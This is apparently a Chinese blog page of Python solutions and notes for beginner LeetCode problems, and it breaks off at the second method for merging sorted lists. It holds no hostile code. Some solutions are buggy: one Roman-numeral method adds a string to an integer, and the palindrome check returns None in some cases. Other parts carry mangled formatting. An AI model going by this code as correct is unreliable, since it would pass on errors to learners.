<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums, target</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hashmap = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">        	hashmap[value] = key</span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            j = hashmap.get(target - num)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> j != i:</span><br><span class="line">                <span class="keyword">return</span> [i, j]</span><br></pre></td></tr></table></figure>
<h2 id="7-reverse-integer-整数反转">#7 reverse-integer 整数反转</h2>
<h3 id="Question-v2">Question</h3>
<p>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
<blockquote>
<p>注意:</p>
<p>假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−231,  231 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。</p>
</blockquote>
<h3 id="Example-v2">Example</h3>
<p>示例 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br></pre></td></tr></table></figure>
<p>示例 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br></pre></td></tr></table></figure>
<p>示例 3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v2">Solution</h3>
<h4 id="方法一-v2">方法一</h4>
<p>首先想到的肯定是将<code>int</code>类型转换成<code>str</code>类型，逆置后再转换成<code>int</code>类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            x = int(str(x)[::<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x= int(<span class="string">&#x27;-&#x27;</span> + str(abs(x))[::<span class="number">-1</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">2</span>**<span class="number">31</span> <span class="keyword">and</span> x &gt; <span class="number">-2</span>**<span class="number">31</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>这个代码最巧妙的地方就在于使用了<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017269965565856">切片</a>这种特性来直接逆置字符串。</strong></p>
<h4 id="方法二-v2">方法二</h4>
<p>我们想重复“弹出” x的最后一位数字，并将它“推入”到 rev 的后面。最后，rev 将与 x相反。</p>
<p>要在没有辅助堆栈 / 数组的帮助下 “弹出” 和 “推入” 数字，我们可以使用数学方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//pop operation:</span><br><span class="line">pop = x % <span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">//push operation:</span><br><span class="line">temp = rev * <span class="number">10</span> + pop;</span><br><span class="line">rev = temp;</span><br></pre></td></tr></table></figure>
<h3 id="Extra">Extra</h3>
<ol>
<li>
<p>数值交换：<code>x, y = y, x</code></p>
</li>
<li>
<p>int to list：<code>l = [int(x) for x in str(num)]</code></p>
</li>
<li>
<p>list to int：</p>
<ul>
<li>
<p>使用列表生成器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [str(i) <span class="keyword">for</span> i <span class="keyword">in</span> list]</span><br><span class="line">res = int(<span class="string">&#x27;&#x27;</span>.join(s))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用<code>map</code>函数：<code>res = int(''.join(map(str, list)))</code></p>
</li>
</ul>
</li>
</ol>
<h2 id="9-palindrome-number-回文数">#9 palindrome-number 回文数</h2>
<h3 id="Question-v3">Question</h3>
<p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
<h3 id="Example-v3">Example</h3>
<ul>
<li>
<p>示例 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br><span class="line">示例 2:</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>示例2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>示例3：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Solution-v3">Solution</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            y = int(str(x)[::<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">if</span> x == y:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h2 id="13-roman-to-integer-罗马数字转整数">#13_roman-to-integer 罗马数字转整数</h2>
<h3 id="Question-v4">Question</h3>
<p>罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。</p>
<blockquote>
<p>字符          数值<br>
I             1<br>
V             5<br>
X             10<br>
L             50<br>
C             100<br>
D             500<br>
M             1000</p>
</blockquote>
<p>例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p>
<ul>
<li>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。</li>
<li>X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。</li>
<li>C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。</li>
</ul>
<p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p>
<h3 id="Example-v4">Example</h3>
<p><strong>示例 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;III&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
<p><strong>示例 2:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;IV&quot;</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>
<p><strong>示例 3:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;IX&quot;</span><br><span class="line">输出: 9</span><br></pre></td></tr></table></figure>
<p><strong>示例 4:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LVIII&quot;</span><br><span class="line">输出: 58</span><br><span class="line">解释: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3.</span><br></pre></td></tr></table></figure>
<p><strong>示例 5:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;MCMXCIV&quot;</span><br><span class="line">输出: 1994</span><br><span class="line">解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4.</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v4">Solution</h3>
<h4 id="方法一-v3">方法一</h4>
<p><strong>思路</strong>：从左往右一位一位的看，如果这一位数字比它右边一位的数字大或与其相等，则加上这一位代表的值，如果它比右边一位小，则减去这一位代表的数字。</p>
<blockquote>
<p>例如： ‘MMCMLXIV’: 第一位是M，它的后一位也是M，所以 num = 0 + 1000，之后 M &gt; C, num = num + 1000 =2000,之后到特殊值，因为C&lt;M，所以num=num-C =2000-100=1900,之后再加上1000得到 num=2900……以此类推进行下去，最后可得到 num = 2964</p>
</blockquote>
<p>需要注意的是，位与后一位的比较只需进行到倒数第二位即可，因为最后一位没有比它小的一位能够进行比较，直接加上最后一位代表的值即可。</p>
<blockquote>
<p>判断到倒数第二位时，如果最后一个数比前一个数大，程序就会直接减去倒数第二个数，然后直接加上最后一个数就行了。所以最后一个数不管比前面的数大还是小都会直接加上它的值。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        roman_dict = &#123;<span class="string">&#x27;M&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;L&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;X&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;V&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s) - <span class="number">1</span>):</span><br><span class="line">        	<span class="keyword">if</span> roman_dict.get(s[i]) &gt;= roman_dict.get(s[i+<span class="number">1</span>]):</span><br><span class="line">        		sum += roman_dict.get(s[i])</span><br><span class="line">        	<span class="keyword">else</span>:</span><br><span class="line">        		sum -= roman_dict.get(s[i])</span><br><span class="line"></span><br><span class="line">        last_num = s[len(s) - <span class="number">1</span>]</span><br><span class="line">        sum += last_num</span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<h4 id="方法二-v3">方法二</h4>
<p><strong>思路：</strong></p>
<ul>
<li>构建一个字典记录所有罗马数字子串，注意长度为2的子串记录的值是**（实际值 - 子串内左边罗马数字代表的数值）**。</li>
<li>这样一来，遍历整个 s 的时候判断当前位置和前一个位置的两个字符组成的字符串是否在字典内，如果在就记录值，不在就说明当前位置不存在小数字在前面的情况，直接记录当前位置字符对应值。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        roman_dict = &#123;<span class="string">&#x27;M&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;L&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;X&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;V&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;IV&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;IX&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;XL&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;XC&#x27;</span>: <span class="number">80</span>, <span class="string">&#x27;CD&#x27;</span>: <span class="number">300</span>, <span class="string">&#x27;CM&#x27;</span>: <span class="number">800</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sum(roman_dict.get(s[max(i<span class="number">-1</span>, <span class="number">0</span>): i+<span class="number">1</span>], roman_dict[n]) <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(s))</span><br></pre></td></tr></table></figure>
<h3 id="Extra-v2">Extra</h3>
<ol>
<li>
<p><code>sum(iterable, [start]) -&gt; number</code></p>
</li>
<li>
<p>生成器（generator）</p>
<ul>
<li>
<pre><code class="language-python">g = (x * x for x in range(10))
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 如果一个函数定义中包含&#96;yield&#96;关键字，那么这个函数就不再是一个普通函数，而是一个generator：</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  def fib(max):</span><br><span class="line">      n, a, b &#x3D; 0, 0, 1</span><br><span class="line">      while n &lt; max:</span><br><span class="line">          yield b</span><br><span class="line">          a, b &#x3D; b, a + b</span><br><span class="line">          n &#x3D; n + 1</span><br><span class="line">      return &#39;done&#39;</span><br></pre></td></tr></table></figure>



</code></pre>
</li>
</ul>
</li>
</ol>
<h2 id="14-longest-common-prefix-最长公共前缀">#14 longest-common-prefix 最长公共前缀</h2>
<h3 id="Question-v5">Question</h3>
<p>编写一个函数来查找字符串数组中的最长公共前缀。</p>
<p>如果不存在公共前缀，返回空字符串 <code>&quot;&quot;</code>。</p>
<p>所有输入只包含小写字母 <code>a-z</code> 。</p>
<h3 id="Example-v5">Example</h3>
<p><strong>示例1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">输出: &quot;fl&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">输出: &quot;&quot;</span><br><span class="line">解释: 输入不存在公共前缀。</span><br></pre></td></tr></table></figure>
<h3 id="Solutions">Solutions</h3>
<h4 id="方法一-v4">方法一</h4>
<p><strong>思路</strong>：</p>
<ol>
<li>首先想到列表为空的情况，返回空字符串。</li>
<li>第一个字符串的第一位与第二个字符串的第一位比较，若相同则继续将第二个字符串的第一位和第三个字符串第一位比较，依次类推。若比较到第<code>j</code>和<code>j+1</code>个字符串的第k位不同则返回第一个字符串的前<code>j</code>个子串（不包括第<code>j</code>个字符。</li>
<li>若最后所有字符串都相同，则返回第一个字符串长度为<code>strs</code>中元素的长度最小的子串。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type strs: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> len(strs) == <span class="number">0</span>:</span><br><span class="line">        	<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        min_len = min(list(map(len, [strs[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strs))])))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(min_len):</span><br><span class="line">        	<span class="keyword">for</span> k <span class="keyword">in</span> range(len(strs) - <span class="number">1</span>):</span><br><span class="line">        		<span class="keyword">if</span> strs[k][j] != strs[k+<span class="number">1</span>][j]:</span><br><span class="line">        			<span class="keyword">return</span> strs[<span class="number">0</span>][:j]</span><br><span class="line">        <span class="keyword">return</span> strs[<span class="number">0</span>][:min_len] <span class="keyword">if</span> min_len <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="方法二-v4">方法二</h4>
<p><strong>思路：</strong></p>
<p>利用<code>zip</code>函数解包以及<code>set</code>判断是否相同，来对每一个单词的同一位置的字母进行比较</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type strs: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> zip(*strs):</span><br><span class="line">            tmp_set = set(tmp)</span><br><span class="line">            <span class="keyword">if</span> len(tmp_set) == <span class="number">1</span>:</span><br><span class="line">                res += tmp[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<h3 id="Extra-v3">Extra</h3>
<ol>
<li>
<p><code>*</code>解包操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line"><span class="meta">... </span>    print(a,b,c)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*<span class="string">&quot;abc&quot;</span>)</span><br><span class="line">a b c</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>,<span class="string">&quot;b&quot;</span>:<span class="number">2</span>,<span class="string">&quot;c&quot;</span>:<span class="number">3</span>&#125;)</span><br><span class="line">a b c</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>zip()</code>函数</p>
<p>把两个或多个数组的所有元素按索引对齐，然后按索引合并成新数组。</p>
</li>
<li>
<p><code>set</code>中不允许有重复的元素存在。</p>
</li>
</ol>
<h2 id="20-valid-parentheses-有效括号">#20 valid-parentheses 有效括号</h2>
<h3 id="Question-v6">Question</h3>
<p>给定一个只包括 ‘(’，’)’，’{’，’}’，’[’，’]’ 的字符串，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<ul>
<li>左括号必须用相同类型的右括号闭合。</li>
<li>左括号必须以正确的顺序闭合。</li>
</ul>
<p>注意空字符串可被认为是有效字符串。</p>
<h3 id="Example-v6">Example</h3>
<p><strong>示例1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;()&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>示例2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;()[]&#123;&#125;&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>示例3</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;(]&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<p><strong>示例4</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;([)]&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<p><strong>示例5</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;&#123;[]&#125;&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v5">Solution</h3>
<h4 id="方法一-v5">方法一</h4>
<p><strong>思路</strong></p>
<ol>
<li>首先空字符串返回<code>True</code></li>
<li>栈先入后出特点恰好与本题括号排序特点一致，即若遇到左括号入栈，遇到右括号时将对应栈顶左括号出栈，则遍历完所有括号后 <code>stack</code> 仍然为空；</li>
<li>需要注意的是若栈为空，且此时读取到的字符是<code>right_par</code>，则直接返回<code>False</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        left_par = [<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>]</span><br><span class="line">        right_par = [<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>] <span class="keyword">in</span> right_par:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        l = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        	<span class="keyword">if</span> s[i] <span class="keyword">in</span> left_par:</span><br><span class="line">        		l.append(s[i])</span><br><span class="line">        	<span class="keyword">elif</span> l == [] <span class="keyword">and</span> s[i] <span class="keyword">in</span> right_par:</span><br><span class="line">        		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        	<span class="keyword">else</span>:</span><br><span class="line">        		<span class="keyword">if</span> left_par.index(l.pop(<span class="number">-1</span>)) != right_par.index(s[i]):</span><br><span class="line">        			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> l == []:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h4 id="方法二-v5">方法二</h4>
<blockquote>
<p>​	其实思路是一样的，关键是用字典来替换方法一的两个初始列表</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span>(<span class="params">self, s: str</span>) -&gt; bool:</span></span><br><span class="line">        dic = &#123;<span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,  <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;?&#x27;</span>: <span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> dic: stack.append(c)</span><br><span class="line">            <span class="keyword">elif</span> dic[stack.pop()] != c: <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">        <span class="keyword">return</span> len(stack) == <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>解析</strong></p>
<ol>
<li>
<p><code>stack</code>初始化的时候为什么要加一个<code>?</code></p>
<p>栈 <code>stack</code> 为空时， <code>stack.pop()</code> 操作会报错；因此，我们采用一个取巧方法，给 <code>stack</code> 赋初值<code> ?</code>，并在哈希表 <code>dic</code>中建立<code> key: '?'，value:'?'key</code>的对应关系予以配合。此时当 stack 为空且 c 为右括号时，可以正常提前返回 <code>false</code>。</p>
</li>
</ol>
<h3 id="Extra-v4">Extra</h3>
<ol>
<li>Python模拟栈的操作
<ul>
<li>压栈：<code>list.append()</code></li>
<li>出栈：<code>list.pop()</code></li>
</ul>
</li>
<li><code>range([start,] end)</code>：<code>start</code>默认是0，返回<code>start - (end-1)</code>的迭代器。</li>
</ol>
<h2 id="21-merge-two-sorted-lists-合并两个有序链表">#21 merge-two-sorted-lists 合并两个有序链表</h2>
<h3 id="Question-v7">Question</h3>
<p>将两个有序链表合并为一个新的有序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。</p>
<h3 id="Example-v7">Example</h3>
<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line">输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v6">Solution</h3>
<h4 id="方法一-v6">方法一</h4>
<p><strong>思路</strong></p>
<ol>
<li>要考虑到<code>l1</code>或<code>l2</code>为<code>None</code>的情况下，直接返回非空的链表。</li>
<li>将两个链表的元素中<code>val</code>分别存入两个列表，拼接这两个列表后进行排序，把排序后的列表中的元素组成一个新的链表。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span>(<span class="params">self, l1, l2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        	<span class="keyword">return</span> l2</span><br><span class="line">        <span class="keyword">if</span> l2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        	<span class="keyword">return</span> l1</span><br><span class="line">        tmp1, tmp2 = [], []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> l1:</span><br><span class="line">        	tmp1.append(l1.val)</span><br><span class="line">        	l1 = l1.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> l2:</span><br><span class="line">        	tmp2.append(l2.val)</span><br><span class="line">        	l2 = l2.next</span><br><span class="line"></span><br><span class="line">        l3 = sorted(tmp1 + tmp2)</span><br><span class="line"></span><br><span class="line">        l = ListNode(l3[<span class="number">0</span>])</span><br><span class="line">        l.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        p = l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(l3)):</span><br><span class="line">        	tmp = ListNode(l3[i])</span><br><span class="line">        	tmp.next = <span class="literal">None</span></span><br><span class="line">        	p.next = tmp</span><br><span class="line">        	p = tmp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure>
<h4 id="方法二-v6">方法二</h4>
<p><strong>思路</strong></p>
